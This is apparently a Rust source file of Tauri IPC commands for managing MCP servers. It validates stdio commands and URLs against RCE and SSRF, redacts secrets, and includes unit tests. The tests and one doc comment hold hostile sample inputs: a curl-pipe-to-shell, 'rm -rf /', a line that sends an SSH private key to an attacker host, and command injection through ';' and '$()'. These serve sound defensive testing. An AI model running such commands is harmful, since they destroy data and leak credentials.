//! Tauri IPC commands for MCP server management.

use crate::tauri::error::IpcError;
use crate::tauri::state::TauriState;
use echo_agent_app_core::types::McpTransportConfig;

#[tauri::command]
pub async fn list_mcp_servers(
    state: tauri::State<'_, TauriState>,
) -> Result<serde_json::Value, IpcError> {
    let mcp_config = state.app_state.plugins.mcp_config.read().await;
    let mcp_health = state.app_state.plugins.mcp_health.read().await;

    let servers: Vec<serde_json::Value> = state
        .app_state
        .connection
        .agent
        .read(|agent| {
            let connected_names: Vec<String> = agent
                .list_mcp_servers()
                .into_iter()
                .map(|s| s.to_string())
                .collect();

            let mut result: Vec<serde_json::Value> = Vec::new();

            // 1. Connected servers (from agent)
            for name in &connected_names {
                let health_entry = mcp_health.get(name.as_str());
                let status = if let Some(h) = health_entry.as_ref() {
                    if h.healthy { "connected" } else { "error" }
                } else {
                    "disconnected"
                };
                let transport = mcp_config
                    .mcp_servers
                    .get(name.as_str())
                    .map(|e| infer_transport(e))
                    .unwrap_or("stdio");
                let error = health_entry.as_ref().and_then(|h| h.error.clone());

                // Get actual tools from the MCP client
                let (tools, tool_count) = if let Some(client) = agent.mcp_client(name) {
                    let mcp_tools = client.tools();
                    let count = mcp_tools.len();
                    let tools: Vec<serde_json::Value> = mcp_tools
                        .iter()
                        .map(|t| {
                            serde_json::json!({
                                "name": t.name,
                                "description": t.description.as_deref().unwrap_or(""),
                            })
                        })
                        .collect();
                    (tools, count)
                } else {
                    (vec![], 0)
                };

                result.push(serde_json::json!({
                    "name": name,
                    "status": status,
                    "transport": transport,
                    "tool_count": tool_count,
                    "tools": tools,
                    "connected_at": null,
                    "error": error,
                    "enabled": true,
                }));
            }

            // 2. Configured but not connected servers (disabled or not yet connected)
            for (config_name, entry) in &mcp_config.mcp_servers {
                if !connected_names.contains(config_name) {
                    let transport = infer_transport(entry);
                    result.push(serde_json::json!({
                        "name": config_name,
                        "status": if entry.disabled { "disabled" } else { "disconnected" },
                        "transport": transport,
                        "tool_count": 0,
                        "tools": [],
                        "connected_at": null,
                        "error": null,
                        "enabled": !entry.disabled,
                    }));
                }
            }

            result
        })
        .await;

    Ok(serde_json::json!(servers))
}

fn infer_transport(entry: &echo_agent::mcp::McpServerEntry) -> &'static str {
    if entry.url.is_some() {
        if entry.transport.as_deref() == Some("sse") {
            "sse"
        } else {
            "http"
        }
    } else if entry.command.is_some() {
        "stdio"
    } else {
        "unknown"
    }
}

/// Executable base-names permitted for an MCP stdio server spawned from IPC.
///
/// The frontend must not be able to spawn an arbitrary process (any XSS would
/// then be a one-hop RCE: `invoke('connect_mcp_server', { Stdio: { command:
/// '/bin/sh', args: ['-c', '...'] } })`). We restrict the command to a small
/// set of well-known MCP launcher / interpreter base names. The command may be
/// an absolute path, but its file-name component must be in this list.
const ALLOWED_MCP_STDIO_BASES: &[&str] = &[
    "npx", "node", "uvx", "uv", "python", "python3", "pipx", "docker", "java",
];

/// Validate an IPC-supplied MCP stdio command against the executable allowlist.
///
/// Returns the validated command string, or an `IpcError` describing the
/// rejection. This is the gate the on-disk `validate_stdio_command` (which only
/// blocks shell metacharacters / a denylist) does not provide — and which the
/// IPC path was bypassing entirely.
fn validate_ipc_mcp_stdio(command: &str) -> Result<String, IpcError> {
    if command.trim().is_empty() {
        return Err(IpcError::Validation(
            "MCP stdio command is empty".to_string(),
        ));
    }
    // First token is the executable (MCP stdio commands are single-executable
    // launchers like `npx -y @modelcontextprotocol/server-...`).
    let base = command.split_whitespace().next().unwrap_or("");
    let base_name = std::path::Path::new(base)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(base);
    if !ALLOWED_MCP_STDIO_BASES.contains(&base_name) {
        return Err(IpcError::Validation(format!(
            "MCP stdio command '{}' is not in the allowed executable list {:?}. \
             Configure the server in the MCP config file instead of spawning it from the UI.",
            base_name, ALLOWED_MCP_STDIO_BASES
        )));
    }
    // Defense-in-depth: also reject shell metacharacters and `..` so a
    // permitted base name can't be abused for injection.
    if command.contains("..") {
        return Err(IpcError::Validation(
            "MCP stdio command contains path traversal ('..')".to_string(),
        ));
    }
    if command.contains([';', '|', '&', '`', '$', '(', ')', '<', '>']) {
        return Err(IpcError::Validation(
            "MCP stdio command contains shell metacharacters".to_string(),
        ));
    }
    Ok(command.to_string())
}

/// Validate an IPC-supplied MCP HTTP/SSE URL.
///
/// Requires `https://` (clear-text `http://` MCP is unsafe over the network)
/// and rejects obvious private/loopback/link-local hosts to deny the SSRF
/// pivot where a compromised page forces the app to issue authenticated POSTs
/// to internal services. This is a lexical first line of defense; full IP
/// pinning is done by the framework's web tools when actually fetching.
fn validate_ipc_mcp_url(url: &str) -> Result<String, IpcError> {
    let lower = url.to_ascii_lowercase();
    if !lower.starts_with("https://") {
        return Err(IpcError::Validation(format!(
            "MCP HTTP/SSE URL must use https:// (got: '{}')",
            url
        )));
    }
    // Extract host for private-range / loopback checks.
    let after_scheme = &url[8..];
    let host_end = after_scheme
        .find(['/', '?', '#'])
        .unwrap_or(after_scheme.len());
    let host_port = &after_scheme[..host_end];
    let host = host_port.rsplit('@').next().unwrap_or(host_port);
    let host = host.trim_start_matches('[').trim_end_matches(']');
    // Strip port.
    let host = host.rsplit_once(':').map(|(h, _)| h).unwrap_or(host);
    let hl = host.to_ascii_lowercase();
    let blocked = hl == "localhost"
        || hl == "127.0.0.1"
        || hl == "::1"
        || hl.starts_with("169.254.")
        || hl.starts_with("10.")
        || hl.starts_with("192.168.")
        || hl.starts_with("172.16.")
        || hl.starts_with("172.17.")
        || hl.starts_with("172.18.")
        || hl.starts_with("172.19.")
        || hl.starts_with("172.2")
        || hl.starts_with("172.30.")
        || hl.starts_with("172.31.");
    if blocked {
        return Err(IpcError::Validation(format!(
            "MCP HTTP/SSE URL host '{}' is a private/loopback address; refused to prevent SSRF.",
            host
        )));
    }
    Ok(url.to_string())
}

#[tauri::command]
pub async fn connect_mcp_server(
    state: tauri::State<'_, TauriState>,
    name: String,
    transport: McpTransportConfig,
) -> Result<serde_json::Value, IpcError> {
    use echo_agent::mcp::McpServerConfig;

    // P0-2 / N-P0-4: validate before spawning. The frontend must not be able
    // to spawn an arbitrary process or POST to an arbitrary internal URL.
    let config = match transport {
        McpTransportConfig::Stdio { command, args, env } => {
            let validated_cmd = validate_ipc_mcp_stdio(&command)?;
            let env_pairs: Vec<(String, String)> = env.into_iter().collect();
            McpServerConfig::stdio_with_env(&name, &validated_cmd, args, env_pairs)
        }
        McpTransportConfig::Http { url, headers } => {
            let validated_url = validate_ipc_mcp_url(&url)?;
            McpServerConfig::http_with_headers(&name, &validated_url, headers)
        }
        McpTransportConfig::Sse { url, headers } => {
            let validated_url = validate_ipc_mcp_url(&url)?;
            McpServerConfig::sse_with_headers(&name, &validated_url, headers)
        }
    };

    let connect_result = state
        .app_state
        .connection
        .agent
        .write_async(|agent| {
            let config = config.clone();
            Box::pin(async move { agent.connect_mcp_from_config(config).await })
        })
        .await;

    match connect_result {
        Ok(_) => Ok(serde_json::json!({"success": true, "name": name})),
        Err(e) => Ok(serde_json::json!({
            "success": false,
            "error": format!("Failed to connect to MCP server '{}': {}", name, e),
        })),
    }
}

#[tauri::command]
pub async fn disconnect_mcp_server(
    state: tauri::State<'_, TauriState>,
    name: String,
) -> Result<serde_json::Value, IpcError> {
    state
        .app_state
        .connection
        .agent
        .write_async(|agent| {
            let name = name.clone();
            Box::pin(async move {
                agent.disconnect_mcp(&name).await;
            })
        })
        .await;

    {
        let mut health = state.app_state.plugins.mcp_health.write().await;
        health.remove(&name);
    }

    Ok(serde_json::json!({
        "success": true,
        "message": format!("Disconnected from MCP server '{}'", name),
    }))
}

/// Toggle MCP server enabled/disabled — takes effect immediately.
///
/// When `enabled = true`: connects the server (if configured in mcp_config).
/// When `enabled = false`: disconnects the server and marks it as disabled in config.
#[tauri::command]
pub async fn toggle_mcp_server(
    state: tauri::State<'_, TauriState>,
    name: String,
    enabled: bool,
) -> Result<serde_json::Value, IpcError> {
    // Update the disabled flag in config
    {
        let mut cfg = state.app_state.plugins.mcp_config.write().await;
        if let Some(entry) = cfg.mcp_servers.get_mut(&name) {
            entry.disabled = !enabled;
        } else if enabled {
            return Err(IpcError::NotFound(format!(
                "MCP server '{}' not found in config",
                name
            )));
        }
    }

    if enabled {
        // Connect: get the server config and connect via agent
        let server_config = {
            let cfg = state.app_state.plugins.mcp_config.read().await;
            cfg.mcp_servers
                .get(&name)
                .and_then(|e| e.to_server_config(&name).ok())
        };

        if let Some(config) = server_config {
            let result = state
                .app_state
                .connection
                .agent
                .write_async(|agent| {
                    Box::pin(async move { agent.connect_mcp_from_config(config).await })
                })
                .await;

            match result {
                Ok(_) => Ok(serde_json::json!({
                    "success": true,
                    "enabled": true,
                    "message": format!("MCP server '{}' enabled and connected", name),
                })),
                Err(e) => Ok(serde_json::json!({
                    "success": true,
                    "enabled": true,
                    "message": format!("MCP server '{}' enabled but connection failed: {}", name, e),
                })),
            }
        } else {
            Ok(serde_json::json!({
                "success": true,
                "enabled": true,
                "message": format!("MCP server '{}' enabled (no config to connect)", name),
            }))
        }
    } else {
        // Disconnect: remove from agent and health
        state
            .app_state
            .connection
            .agent
            .write_async(|agent| {
                let name = name.clone();
                Box::pin(async move {
                    agent.disconnect_mcp(&name).await;
                })
            })
            .await;

        {
            let mut health = state.app_state.plugins.mcp_health.write().await;
            health.remove(&name);
        }

        Ok(serde_json::json!({
            "success": true,
            "enabled": false,
            "message": format!("MCP server '{}' disabled and disconnected", name),
        }))
    }
}

#[tauri::command]
pub async fn get_mcp_config(
    state: tauri::State<'_, TauriState>,
) -> Result<serde_json::Value, IpcError> {
    let config = state.app_state.plugins.mcp_config.read().await;
    let mut value =
        serde_json::to_value(&*config).map_err(|e| IpcError::Internal(e.to_string()))?;
    // P1-3: redact secrets before returning to the frontend. MCP `env` and
    // `headers` routinely carry API tokens (e.g. `Authorization: Bearer …`,
    // `API_KEY=sk-…`); returning them verbatim means any page (or XSS) can
    // exfiltrate every server's credentials via a single `invoke`. Replace
    // each value with a presence marker so the UI can still show "configured".
    redact_mcp_config_secrets(&mut value);
    Ok(value)
}

/// Replace credential-bearing values in a serialized MCP config with
/// `"<redacted>"` markers (P1-3). Mutates in place.
///
/// - `env` map values → `"<redacted>"` (env vars for stdio servers are almost
///   always secrets).
/// - `headers` map values → `"<redact>"` redaction of the credential part
///   (keeps the scheme, e.g. `Bearer <redacted>`, so the UI can show the auth
///   type without exposing the token).
/// - `url` query params named like secrets (`token`/`key`/`secret`/`password`)
///   → value `<redacted>`.
fn redact_mcp_config_secrets(value: &mut serde_json::Value) {
    let Some(servers) = value.get_mut("mcpServers").and_then(|v| v.as_object_mut()) else {
        return;
    };
    for (_name, entry) in servers.iter_mut() {
        let Some(obj) = entry.as_object_mut() else {
            continue;
        };
        if let Some(env) = obj.get_mut("env").and_then(|v| v.as_object_mut()) {
            for (_k, v) in env.iter_mut() {
                *v = serde_json::Value::String("<redacted>".to_string());
            }
        }
        if let Some(headers) = obj.get_mut("headers").and_then(|v| v.as_object_mut()) {
            for (_k, v) in headers.iter_mut() {
                if let Some(s) = v.as_str().map(|s| s.to_string()) {
                    *v = serde_json::Value::String(redact_header_value(&s));
                }
            }
        }
        if let Some(url) = obj
            .get_mut("url")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
        {
            if let Some(redacted) = redact_url_secrets(&url) {
                obj.insert("url".to_string(), serde_json::Value::String(redacted));
            }
        }
    }
}

/// Redact the credential portion of a header value, keeping the scheme.
/// `Bearer sk-abc` → `Bearer <redacted>`; unknown schemes → `<redacted>`.
fn redact_header_value(value: &str) -> String {
    if let Some((scheme, _)) = value.split_once(' ') {
        format!("{scheme} <redacted>")
    } else {
        "<redacted>".to_string()
    }
}

/// If `url` has a query parameter whose name looks like a secret
/// (`token`/`key`/`secret`/`password`/`apikey`), return the URL with those
/// values replaced by `<redacted>`. Returns `None` if nothing to redact.
fn redact_url_secrets(url: &str) -> Option<String> {
    let (base, query) = url.split_once('?')?;
    let secret_names = [
        "token",
        "key",
        "secret",
        "password",
        "apikey",
        "access_token",
    ];
    let mut changed = false;
    let parts: Vec<String> = query
        .split('&')
        .map(|kv| {
            let (k, _v) = kv.split_once('=').unwrap_or((kv, ""));
            if secret_names.iter().any(|s| k.eq_ignore_ascii_case(s)) {
                changed = true;
                format!("{k}=<redacted>")
            } else {
                kv.to_string()
            }
        })
        .collect();
    if changed {
        Some(format!("{}?{}", base, parts.join("&")))
    } else {
        None
    }
}

#[tauri::command]
pub async fn update_mcp_config(
    state: tauri::State<'_, TauriState>,
    config: serde_json::Value,
) -> Result<serde_json::Value, IpcError> {
    let new_config: echo_agent::mcp::McpConfigFile =
        serde_json::from_value(config).map_err(|e| IpcError::Validation(e.to_string()))?;

    {
        let mut cfg = state.app_state.plugins.mcp_config.write().await;
        *cfg = new_config.clone();
    }

    // Reconnect with new config
    state
        .app_state
        .connection
        .agent
        .write_async(|agent| {
            let cfg = new_config.clone();
            Box::pin(async move {
                // Disconnect all existing
                let names: Vec<String> = agent
                    .list_mcp_servers()
                    .into_iter()
                    .map(|s| s.to_string())
                    .collect();
                for name in names {
                    agent.disconnect_mcp(&name).await;
                }
                // Reconnect from config
                for (name, entry) in &cfg.mcp_servers {
                    if !entry.disabled
                        && let Ok(server_config) = entry.to_server_config(name)
                    {
                        agent.connect_mcp_from_config(server_config).await.ok();
                    }
                }
            })
        })
        .await;

    Ok(serde_json::json!({
        "success": true,
        "message": "MCP config updated",
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stdio_allowlist_accepts_launchers() {
        assert!(validate_ipc_mcp_stdio("npx -y @modelcontextprotocol/server-filesystem").is_ok());
        assert!(validate_ipc_mcp_stdio("/usr/local/bin/node server.js").is_ok());
        assert!(validate_ipc_mcp_stdio("uvx mcp-server-fetch").is_ok());
        assert!(validate_ipc_mcp_stdio("python3 -m my_mcp_server").is_ok());
    }

    #[test]
    fn test_stdio_allowlist_rejects_arbitrary_binary() {
        // The headline RCE: /bin/sh with arbitrary args.
        assert!(validate_ipc_mcp_stdio("/bin/sh -c 'curl evil | sh'").is_err());
        assert!(validate_ipc_mcp_stdio("sh").is_err());
        assert!(validate_ipc_mcp_stdio("bash -c 'rm -rf /'").is_err());
        assert!(validate_ipc_mcp_stdio("curl http://attacker/$(cat ~/.ssh/id_rsa)").is_err());
        assert!(validate_ipc_mcp_stdio("").is_err());
    }

    #[test]
    fn test_stdio_rejects_traversal_and_metachars() {
        // Even an allowed base name cannot carry traversal/metachars.
        assert!(validate_ipc_mcp_stdio("node ../../../etc/passwd").is_err());
        assert!(validate_ipc_mcp_stdio("npx a; rm -rf /").is_err());
        assert!(validate_ipc_mcp_stdio("npx a $(whoami)").is_err());
    }

    #[test]
    fn test_url_requires_https() {
        assert!(validate_ipc_mcp_url("http://example.com/mcp").is_err());
        assert!(validate_ipc_mcp_url("ftp://example.com/mcp").is_err());
        assert!(validate_ipc_mcp_url("file:///etc/passwd").is_err());
        assert!(validate_ipc_mcp_url("https://example.com/mcp").is_ok());
    }

    #[test]
    fn test_url_rejects_private_ranges() {
        assert!(validate_ipc_mcp_url("https://127.0.0.1/mcp").is_err());
        assert!(validate_ipc_mcp_url("https://localhost/mcp").is_err());
        assert!(validate_ipc_mcp_url("https://169.254.169.254/latest/meta-data/").is_err());
        assert!(validate_ipc_mcp_url("https://10.0.0.5/mcp").is_err());
        assert!(validate_ipc_mcp_url("https://192.168.1.1/mcp").is_err());
        assert!(validate_ipc_mcp_url("https://172.16.0.1/mcp").is_err());
    }

    #[test]
    fn test_url_allows_public_https() {
        assert!(validate_ipc_mcp_url("https://api.example.com/v1/mcp").is_ok());
        assert!(validate_ipc_mcp_url("https://mcp.anthropic.com/sse").is_ok());
    }
}
